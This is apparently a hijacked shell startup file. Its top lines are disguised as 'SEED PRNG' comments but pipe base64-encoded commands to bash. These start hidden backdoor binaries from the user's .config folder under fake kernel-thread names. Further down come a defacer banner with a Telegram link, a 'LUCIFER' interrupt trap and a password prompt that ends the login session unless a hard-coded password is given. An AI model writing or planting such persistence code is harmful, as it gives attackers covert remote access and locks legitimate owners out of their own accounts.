# DO NOT REMOVE THIS LINE. SEED PRNG. #gs-dbus-kernel
{ echo L2Jpbi9wa2lsbCAtMCAtVTEwMDEgZ3MtZGJ1cyAyPi9kZXYvbnVsbCB8fCAoVEVSTT14dGVybS0yNTZjb2xvciBHU19BUkdTPSItayAvaG9tZS9meGtwZGtkbi8uY29uZmlnL2RidXMvZ3MtZGJ1cy5kYXQgLWxpcUQiIGV4ZWMgLWEgJ1trY2FjaGVkXScgJy9ob21lL2Z4a3Bka2RuLy5jb25maWcvZGJ1cy9ncy1kYnVzJyAyPi9kZXYvbnVsbCkK|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng gs-dbus-kernel
# DO NOT REMOVE THIS LINE. SEED PRNG. #defunct-kernel
{ echo L2Jpbi9wa2lsbCAtMCAtVTEwMDEgZGVmdW5jdCAyPi9kZXYvbnVsbCB8fCAoVEVSTT14dGVybS0yNTZjb2xvciBHU19BUkdTPSItayAvaG9tZS9meGtwZGtkbi8uY29uZmlnL2h0b3AvZGVmdW5jdC5kYXQgLWxpcUQiIGV4ZWMgLWEgJ1tjYXJkMC1jcnRjOF0nICcvaG9tZS9meGtwZGtkbi8uY29uZmlnL2h0b3AvZGVmdW5jdCcgMj4vZGV2L251bGwpCg==|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng defunct-kernel
# ---------------------------
# CUSTOM LOGIN BANNER (added by user)
# ---------------------------
# Hide cursor while printing banner, then restore
tput civis 2>/dev/null || true

# top separator (cyan)
printf '\e[36m==================================================================================\e[0m\n'

# title (yellow)
printf '\e[33;1m___| |_________________________________________________________________________________________________________________________________| |__
__   _________________________________________________________________________________________________________________________________   __
  | |                                                                                                                                 | |
  | |      █████       █████  █████   █████████  █████ ███████████ ██████████ ███████████   █████ █████     █████    █████ █████      | |
  | |     ░░███       ░░███  ░░███   ███░░░░░███░░███ ░░███░░░░░░█░░███░░░░░█░░███░░░░░███ ░░███ ░░███    ███░░░███ ░░███ ░░███       | |
  | |      ░███        ░███   ░███  ███     ░░░  ░███  ░███   █ ░  ░███  █ ░  ░███    ░███  ░███  ░███ █ ███   ░░███ ░███  ░███ █     | |
  | |      ░███        ░███   ░███ ░███          ░███  ░███████    ░██████    ░██████████   ░███████████░███    ░███ ░███████████     | |
  | |      ░███        ░███   ░███ ░███          ░███  ░███░░░█    ░███░░█    ░███░░░░░███  ░░░░░░░███░█░███    ░███ ░░░░░░░███░█     | |
  | |      ░███      █ ░███   ░███ ░░███     ███ ░███  ░███  ░     ░███ ░   █ ░███    ░███        ░███░ ░░███   ███        ░███░      | |
  | |      ███████████ ░░████████   ░░█████████  █████ █████       ██████████ █████   █████       █████  ░░░█████░         █████      | |
  | |     ░░░░░░░░░░░   ░░░░░░░░     ░░░░░░░░░  ░░░░░ ░░░░░       ░░░░░░░░░░ ░░░░░   ░░░░░       ░░░░░     ░░░░░░         ░░░░░       | |
__| |_________________________________________________________________________________________________________________________________| |__
__   _________________________________________________________________________________________________________________________________   __
  | |                                                                                                                                 | |  \e[0m\n'


# little arrows (cyan)
printf '\e[36m   ↓↓↓\e[0m\n'

# link label (magenta) + link (bright cyan)
printf '\e[35mLink Tele:\e[0m \e[96mhttps://t.me/OBATKURAP_969\e[0m\n'

# bottom separator
printf '\e[36m=================================================================================================================\e[0m\n'

# Hint PS1 (only set if interactive and not already customized)
if [ -n "$PS1" ]; then
  PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
fi

# Restore cursor
tput cnorm 2>/dev/null || true

# End of custom banner
# ---------------------------

trap "echo 'LUCIFER';exit" INT

read -p "Your password : " passwd;
pass="TFVDSUZFUjQwNCoK"
while true; do
if [[ $(echo $passwd | base64) =~ "$pass" ]];
then
break


else
echo "ga valid"
exit
fi

done